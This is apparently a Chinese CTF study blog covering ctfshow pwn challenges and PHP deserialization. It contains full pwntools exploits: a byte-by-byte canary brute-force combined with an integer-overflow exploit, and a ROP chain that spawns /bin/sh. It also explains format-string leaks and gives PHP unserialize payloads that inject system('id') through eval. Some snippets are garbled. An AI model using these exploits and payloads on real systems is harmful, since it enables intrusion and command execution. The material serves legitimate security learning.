entry.content:
read函数 ssize_t read(int fd, void *buf, size_t count);
fd：文件描述符 0 表示标准输入（stdin） 1 表示标准输出（stdout） 2 表示标准错误（stderr） buf：存放读取数据的缓冲区指针（指向内存） count：希望读取的字节数
read(0, &amp;s[i], 1uLL);
从标准输入读取 1 个字节，存入 s[i]

由于这道题的非常非常重要，我必须单独开一个blog讲解一下 canary保护一个开了canary保护的栈如下 [高地址]参数EIP（返回地址）EBPcanary局部变量（缓冲区buf）[低地址] 为了防止我们覆盖EIP，程序在缓冲区和返回地址之间插了一个随机生成的数值，即canary，如果canary的值和原本不符（比如被我们覆盖成了AAAAAAAA），程序会调用 __stack_chk_fail 函数，终止进程 我们可以把canary理解为cookie 因此，我们必须要在canary的位置覆盖上正确的值，才能覆盖到返回地址，目前有两种办法，泄露和爆破，先讲一下后者 爆破canary爆破的前提条件并不是所有的 Canary 都能爆破，通常需要满足以下两个条件之一： Fork 机制（BROP 中常见）：服务器使用 fork() 创建子进程来处理请求。子进程的内存布局（包括 Canary）是父进程的副本，因此每次连接时的 Canary 都是一样的 静态 Canary：Canary 的值是固定的（例如从固定文件中读取，且文件内容不变），或者随机数种子被固定了。只要我们重新连接，Canary 的值还是那个 如果每次程序运行 Canary 都是完全随机且不同的，这种爆破方法就会失效 逐字节爆破canary如果我们每一次都是尝试不同的地址，那需要尝试256的4次方次，显然不可能，于是我们可以选择逐位爆破，从第1位开始尝试，不动其他3位，这样如果程序不崩溃，那么第1位的值就确定了，以此类推 一个字节的大小是256，也就是说，我们最多需要尝试256*4&#x3D;1024次即可爆破成功 在我突击了几天python后，终于可以理解这段爆破的方法了 # 1. 外层循环：决定我们要猜第几个字节（一共4个）for i in range(4): # 2. 内层循环：尝试所有可能的数值（0x00 - 0xFF） for c in range(256): io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28197) # 每次都要重连 io.sendlineafter(b&#x27;&gt;&#x27;, b&#x27;-1&#x27;) # 触发整数溢出漏洞 # 3. 构造试探性 Payload payload = b&#x27;a&#x27; * 32 + canary + p8(c) io.sendafter(b&#x27;$ &#x27;, payload) # 4. 接收反馈并判断 res = io.recvall(timeout=1) if b&#x27;Canary Value Incorrect&#x27; not in res: canary += p8(c) # 猜对了！记录下来 print(f&quot;[*] Found byte: &#123;hex(c)&#125;&quot;) io.close() break io.close()
eg:ctfshow pwn53 再多一眼看一眼就会爆炸
int __cdecl main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0, 2, 0); logo(); canary(); ctfshow(); return 0;&#125;
int canary()&#123; FILE *stream; // [esp+Ch] [ebp-Ch] stream = fopen(&quot;/canary.txt&quot;, &quot;r&quot;); if ( !stream ) &#123; puts(&quot;/canary.txt: No such file or directory.&quot;); exit(0); &#125; fread(&amp;global_canary, 1u, 4u, stream); return fclose(stream);&#125;
int ctfshow()&#123; size_t nbytes; // [esp+4h] [ebp-54h] BYREF char v2[32]; // [esp+8h] [ebp-50h] BYREF char buf[32]; // [esp+28h] [ebp-30h] BYREF int s1; // [esp+48h] [ebp-10h] BYREF int v5; // [esp+4Ch] [ebp-Ch] v5 = 0; s1 = global_canary; printf(&quot;How many bytes do you want to write to the buffer?\n&gt;&quot;); while ( v5 &lt;= 31 ) &#123; read(0, &amp;v2[v5], 1u); if ( v2[v5] == 10 ) break; ++v5; &#125; __isoc99_sscanf(v2, &quot;%d&quot;, &amp;nbytes); printf(&quot;$ &quot;); read(0, buf, nbytes); if ( memcmp(&amp;s1, &amp;global_canary, 4u) ) &#123; puts(&quot;Error *** Stack Smashing Detected *** : Canary Value Incorrect!&quot;); exit(-1); &#125; puts(&quot;Where is the flag?&quot;); return fflush(stdout);&#125; 这个题实际上是没有开启真正的canary保护的，只是在远程部署了一个类canary的文件，然后用memcmp函数去比较，如果不符合&amp;global_canary里的值就会报错并退出，所以属于是静态canary，值是固定的，因此可以爆破 并且已经给了我们flag后门函数，只要把返回地址覆盖到flag就可以了 int flag()&#123; char s[64]; // [esp+Ch] [ebp-4Ch] BYREF FILE *stream; // [esp+4Ch] [ebp-Ch] stream = fopen(&quot;/ctfshow_flag&quot;, &quot;r&quot;); if ( !stream ) &#123; puts(&quot;/ctfshow_flag: No such file or directory.&quot;); exit(0); &#125; fgets(s, 64, stream); puts(s); return fflush(stdout);&#125;
但是这时我们又迎来了一个新的问题 __isoc99_sscanf(v2, &quot;%d&quot;, &amp;nbytes);printf(&quot;$ &quot;);read(0, buf, nbytes);
int sscanf(const char *str, const char *format, …);
功能：从一个字符串中读取与指定格式相符的数据，并将其存储到后续参数指定的变量地址中，即即 &amp;nbytes 而read函数读入的字节长度就是我们传入的nbytes大小，这导致我们输入的长度是被限制的，这时候就需要我们的整数溢出了 整数溢出这里和CSAPP第二章整数表示和补码的部分高度相关
程序问我们How many bytes do you want to write to the buffer? 假如我们用sscanf输入了-1，会发生什么呢 在内存中，-1 的样子是： 1111 1111 1111 1111 1111 1111 1111 1111 （十六进制为0xFFFFFFFF） %d指有符号整数，它看到最高位为1时，就知道是负数，具体为什么看CSAPP即可 但是由于我们定义了size_t nbytes，也就是说nbytes是一个无符号数，那么read看到的就是4,294,967,295这个数，即我们可以读入这么长的数 也就是我们先用sscanf读进去-1，再用read函数去爆破canary就可以了 canary爆破模板和最终expfrom pwn import *context(arch=&#x27;i386&#x27;, log_level=&#x27;error&#x27;) binary = &#x27;./pwn&#x27;canary = b&#x27;&#x27;#设置初始的canary为空print(f&quot;[+] 开始爆破 Canary...&quot;)# 第一步：双层循环爆破 4 字节 Canaryfor i in range(4): for c in range(256): # 每次尝试都必须重新连接 io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28197) io.sendlineafter(b&#x27;&gt;&#x27;, b&#x27;-1&#x27;) # 尝试发送：Padding + 已知Canary + 当前猜测字节 io.sendafter(b&#x27;$ &#x27;, b&#x27;a&#x27; * 32 + canary + p8(c)) # 判断：如果没有收到报错信息，说明猜对了 res = io.recvall(timeout=1) if b&#x27;Canary Value Incorrect&#x27; not in res: canary += p8(c) print(f&quot;[*] Found byte &#123;i+1&#125;: &#123;hex(c)&#125; -&gt; Current: &#123;canary.hex()&#125;&quot;) io.close() break # 跳出内层循环，猜下一个字节 io.close()# 第二步：拿到完整 Canary，发送最终 Payloadprint(f&quot;[+] Final Canary: &#123;canary.hex()&#125;&quot;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28197)io.sendlineafter(b&#x27;&gt;&#x27;, b&#x27;-1&#x27;)payload = flat(b&#x27;a&#x27; * 32, canary, p32(0) * 4, ELF(binary).sym[&#x27;flag&#x27;])io.sendafter(b&#x27;$ &#x27;, payload)io.interactive()

Ropchain一把梭工具，非常好用，比较简单就不介绍了 eg：CTFshow pwn73 from pwn import *from struct import packio=process(&quot;./pwn73&quot;)# Padding goes herep = cyclic(0x18+4)p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080b81c6) # pop eax ; retp += &#x27;/bin&#x27;p += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4p += pack(&#x27;&lt;I&#x27;, 0x080b81c6) # pop eax ; retp += &#x27;//sh&#x27;p += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x08049303) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080de955) # pop ecx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x08049303) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806cc25) # int 0x80io.recvuntil(&quot;hand!!\n&quot;)io.sendline(p)io.interactive()
one_gadgeteg：ctfshow pwn74int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v4[3]; // [rsp+8h] [rbp-18h] BYREF v4[2] = __readfsqword(0x28u); init(argc, argv, envp); puts(s); puts(asc_A80); puts(asc_B00); puts(asc_B90); puts(asc_C20); puts(asc_CA8); puts(asc_D40); puts(&quot; * ************************************* &quot;); puts(aClassifyCtfsho); puts(&quot; * Type : PWN_Tricks &quot;); puts(&quot; * Site : https://ctf.show/ &quot;); puts(&quot; * Hint : Use one_gadget a shuttle! &quot;); puts(&quot; * ************************************* &quot;); printf(&quot;What&#x27;s this:%p ?\n&quot;, &amp;printf); __isoc99_scanf(&quot;%ld&quot;, v4); v4[1] = v4[0]; ((void (*)(void))v4[0])(); return 0;&#125;
这个题是NX，PIE，canary保护全开的，打印了printf的地址 这个题我们不想需要栈溢出，因此canary保护可有可无，而PIE就要求我们libc了

深入理解格式化字符串要想理解格式化字符串的原理，我们必须要知道的一个问题是，printf调用时，它的第一个参数是什么，比如printf(&quot;%d %f\n&quot;, x, y);，它的一参是x吗？
让我们来看看printf的声明，int printf(const char *format, ...)，没错，printf的一参是”%d %f\n”，即格式化字符串，这一点是很多同学都没有意识到的
我们必须要深刻理解的第二个问题是，什么是格式化字符串

格式化字符串是一些程序设计语言的输入&#x2F;输出库中能将字符串参数转换为另一种形式输出的函数，它通过用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。我补充一点，这里的转换说明即格式化占位符。

（ps：不要因为长就不读了，反而要读得更仔细，通过学习pwn我认识到，越涉及到一个概念的本质，描述的文字就会越详细）
通俗的说，它就是包含格式化占位符的字符串
格式化字符串的工作原理我们平时使用printf时，格式化占位符是必须和后面的参数一一对应的，有多少个格式化占位符，就必须有多少个参数
这里必须再说一下printf是如何调用参数的。在64位系统中，我们的参数先会按照一定的顺序被放到6个寄存器里，从第7个参数往后，参数会被放在栈里；32位系统中，参数是直接被放到栈里保存的。
#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %d&quot;,a,b,c);return 0;
在这段程序中，我们的参数先会按顺序被放到栈空间里保存，然后，printf会从栈空间里去找对应的数据
#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %d&quot;,a,b);return 0;
而我们去掉了参数c会发生什么呢
结果会是：1 2 一个很奇怪的数
因为有第三个%d的存在，printf会试图去栈或寄存器（原本c所在的位置）再取一个整数，但是显然是无法找到c的，于是就会随机地从错误的位置读取内存，就把这个奇怪的数翻了出来。这也侧面证明了printf是从栈里去寻址的
#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %p&quot;,a,b);return 0;

我们把占位符改成%p，输出的结果就是c在栈上的地址
#include&lt;stdio.h&gt;char a[]scanf(&quot;%s&quot;,&amp;)printf(a);return 0;
更极端的情况如上
因此，我们可以利用格式化字符串实现可读可写
eg1：newstar2025 week2 刻在栈上的秘密
题目内容：欢迎来到 x64 位餐厅！服务员 printf 先生有点健忘，他只能记住您菜单上的前 6 道菜 (RDI, RSI, RDX…)，再多就只能堆在摇摇晃晃的餐盘 (栈) 上了。更糟糕的是，他会把你写的菜单原封不动地大声念出来。你能设计一份别有用心的菜单，让他念着念着，就把秘密房间的密码念给你听吗？

这个题没有给我们可执行文件，直接nc链接做即可

我们先输入aaaa加几个%p试一下，发现没有看到41414141，这说明aaaa被当成了格式化字符串的一部分被传入了。由于题目简单，我合理推测该prntf函数只有一个参数，即偏移量为0。不过这不重要，正常题目不会这样的

下面开始正式做题

我们可以看到，第11个%p打印出了密码所在寄存器的地址


总结格式化字符串漏洞的产生，就是参数和格式化占位符没有数量上的一一对应，即源代码里的格式化占位符少于参数的数量，于是我们就可以通过输入不同的格式化占位符，去打印栈空间里对应的内容

简单的payload例1&lt;?phperror_reporting(0);$KEY=&#x27;ctf.bugku.com&#x27;;include_once(&quot;flag.php&quot;);$cookie = $_COOKIE[&#x27;BUGKU&#x27;];if(isset($_GET[&#x27;23065&#x27;])) &#123;    show_source(__FILE__);&#125;elseif (unserialize($cookie) === &quot;$KEY&quot;)&#123;    echo &quot;$flag&quot;;&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;    &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;        &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;        &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt;        &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;&gt;&lt;/p&gt;    &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;?&gt;
其中$_COOKIE是超全局变量，实际上就是浏览器里的cookie，有[]证明它其实是个数组，其中有一个名为BUGKU的数据
$cookie &#x3D; $_COOKIE[‘BUGKU’]就是把后者赋值到前者，方便表达
===是全等运算符，要保证两端的值和类型都相等
也就是说，必须让cookie反序列化的结果和变量KEY全等，也就是等于ctf.bugku.com
由于这里没有类，不涉及对象，payload直接用字符串反序列化的格式即可
bp抓包后把cookie的值改成s:13:&#39;ctf.bugku.com&#39;;即可
例2&lt;?phphighlight_file(__FILE__);error_reporting(0);class test &#123;    public $a = &#x27;echo &quot;this is test!!&quot;;&#x27;;    public function displayVar() &#123;        eval($this-&gt;a);    &#125;&#125;$get = $_GET[&quot;benben(可控字符串)&quot;];$b = unserialize($get);$b-&gt;displayVar() ;?&gt;

$_GET同样是超全局变量
它可用于收集提交HTML表单(method&#x3D;”get”)之后的表单数据。_GET也可以收集URL中的发送的数据
eval()可以执行命令
我们必须要让定义的$a为我们想执行的命令，比如system(&quot;id&quot;);
反序列化函数unserialize会根据我们提供的字符串，在内存中重新创建一个全新的对象
O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:15:&quot;system(&#39;id&#39;);&quot;;}
就是找到tset这个类，生成成员方法为a，值是system(&#39;id&#39;)的对象
而这段payload可以通过GET方式被提交
172.16.1.6:8006/class06/index.php?benben=O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:13:&quot;system(&quot;id&quot;);&quot;;}
魔术方法
benben&#x3D;O:4:”User”;1{s:8:”username”;s:2:”ls”;}
benben&#x3D;0:4:”User”;1{s:8:”username”;}

